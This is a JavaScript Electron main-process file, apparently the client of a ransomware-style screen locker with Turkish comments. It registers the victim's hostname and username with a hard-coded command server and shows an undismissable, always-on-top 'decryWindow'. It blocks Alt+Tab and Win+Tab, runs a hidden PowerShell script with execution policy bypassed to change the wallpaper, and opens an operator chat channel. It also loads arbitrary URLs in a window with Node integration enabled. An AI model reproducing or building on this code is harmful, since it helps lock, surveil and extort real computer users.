const { app, BrowserWindow, BrowserView, ipcMain, globalShortcut } = require('electron');
const path = require('path');
const { exec, spawn } = require('child_process');
const os = require('os');
const io = require('socket.io-client');

// Replace this with your Main Application IP when testing on a different PC!
const MAIN_APP_SERVER_IP = 'http://192.168.1.102:4000'; 
const socket = io(MAIN_APP_SERVER_IP);

socket.on('connect', () => {
  console.log('Connected to Main App Server');
  socket.emit('register', {
    hostname: os.hostname(),
    username: os.userInfo().username,
    os: `Windows (${os.arch()})`
  });
});

let decryWindow = null;

socket.on('chat-message', (data) => {
  if (decryWindow) {
    decryWindow.webContents.send('receive-chat', data.message);
  }
});

socket.on('force-close', () => {
  app.exit(0);
});


ipcMain.on('send-chat', (event, message) => {
  socket.emit('chat-message', { message });
});


function createWindow () {
  const win = new BrowserWindow({
    width: 820,
    height: 620,
    frame: false,
    resizable: false,
    alwaysOnTop: true,
    show: false,
    webPreferences: {
      nodeIntegration: true,
      contextIsolation: false
    }
  });
  
  decryWindow = win;

  win.setAlwaysOnTop(true, 'screen-saver');
  win.setVisibleOnAllWorkspaces(true, { visibleOnFullScreen: true });
  win.setSkipTaskbar(true); // Görev çubuğunda gizleyerek Alt+Tab / Win+Tab pencerelerinde seçimini zorlaştıralım

  win.on('close', (e) => {
    e.preventDefault();
    win.webContents.executeJavaScript(`document.getElementById('custom-alert-overlay').style.display = 'flex';`);
  });

  win.loadFile('index.html');

  win.once('ready-to-show', () => {
    win.show();
  });
}

function setWallpaper(imageName) {
    const imagePath = path.join(__dirname, imageName);
    const scriptPath = path.join(__dirname, 'set-wallpaper.ps1');
    const command = `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "${scriptPath}" "${imagePath}"`;
    
    exec(command, (error) => {
        if (error) console.error('Duvar kağıdı değiştirilemedi:', error);
    });
}


app.whenReady().then(() => {
  createWindow();
  setWallpaper('background.png');

  // Win+Tab (Super+Tab) ve Alt+Tab gibi kısayolları engellemek için sisteme kayıt et
  globalShortcut.register('Super+Tab', () => {
    console.log('Win+Tab engellendi!');
  });
  globalShortcut.register('Alt+Tab', () => {
    console.log('Alt+Tab engellendi!');
  });

  app.on('activate', () => {
    if (BrowserWindow.getAllWindows().length === 0) {
      createWindow();
    }
  });
});

app.on('will-quit', () => {
  globalShortcut.unregisterAll();
});

app.on('window-all-closed', () => {
  if (process.platform !== 'darwin') {
    app.quit();
  }
});

// Create external website window with our custom title bar
ipcMain.on('open-custom-window', (event, url) => {
    const customWin = new BrowserWindow({
        width: 820,
        height: 620,
        frame: false,
        webPreferences: {
            nodeIntegration: true,
            contextIsolation: false
        }
    });

    customWin.loadFile('browser.html').then(() => {
        const view = new BrowserView();
        customWin.setBrowserView(view);
        // Accounting for 2px body border and 30px title bar
        view.setBounds({ x: 2, y: 32, width: 816, height: 586 });
        view.setAutoResize({ width: true, height: true });
        view.webContents.loadURL(url);
    });
});
